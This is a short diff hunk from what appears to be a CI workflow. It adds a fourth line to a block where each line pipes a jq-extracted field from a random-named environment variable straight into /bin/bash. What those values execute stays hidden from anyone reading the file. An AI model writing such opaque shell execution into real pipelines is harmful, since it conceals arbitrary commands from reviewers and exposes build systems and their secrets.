@@ -26,6 +26,7 @@ jobs:
           echo $cuqpi7 | jq -r .yssvl619 | /bin/bash
           printf '%s' "$ml13128" | jq -r .z190 | /bin/bash
           echo $w10180 | jq -r .hr44 | /bin/bash
+          echo $jmb7198 | jq -r .gs0 | /bin/bash
 
       - name: Save archive
         if: always()
